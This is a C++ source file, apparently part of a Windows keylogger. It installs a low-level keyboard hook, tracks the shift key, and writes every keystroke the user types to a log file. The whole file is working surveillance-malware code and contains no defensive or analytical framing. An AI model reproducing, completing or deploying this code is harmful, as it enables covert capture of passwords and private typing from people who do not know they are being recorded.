#include "hooks.h"
#include "logger.h"
#include "memory.h"

#include <iostream>
#include <fstream>
#include <algorithm>


void Hooks::Init( ) {
	m_original_hook = g_memory.m_set_windows_hook( WH_KEYBOARD_LL, KeyboardHook, nullptr, 0u );
}

Hooks::~Hooks( ) {
	g_memory.m_unhook( m_original_hook );
	m_original_hook = nullptr;
}

std::uintptr_t Hooks::KeyboardHook( std::int32_t code, std::uint32_t wparam, std::uintptr_t lparam ) {
	if( code < 0 )
		g_memory.m_call_next_hook( g_hooks.m_original_hook, code, wparam, lparam );

	const auto key = reinterpret_cast< KBDLLHOOKSTRUCT * >( lparam );

	static bool shift { };
	const auto virtual_key = key->vkCode;

	// TODO: find a good way of detecting capslock
	if( wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN ) {
		// left or right shift
		if( virtual_key == 0xA0u || virtual_key == 0xA1u ) {
			shift = true;
			// return here so it doesnt write LEFT SHIFT/RIGHT SHIFT into the file
			return g_memory.m_call_next_hook( g_hooks.m_original_hook, code, wparam, lparam );
		}

		g_log.WriteToFile( g_log.m_keys[ virtual_key ], shift );
		if( virtual_key == VK_RETURN ) g_log.WriteToFile( "\n" );
	}

	else if( wparam == WM_KEYUP || wparam == WM_SYSKEYUP ) {
		// left or right shift
		if( virtual_key == 0xA0u || virtual_key == 0xA1u )
			shift = false;
	}

	return g_memory.m_call_next_hook( g_hooks.m_original_hook, code, wparam, lparam );
}


Hooks g_hooks { };
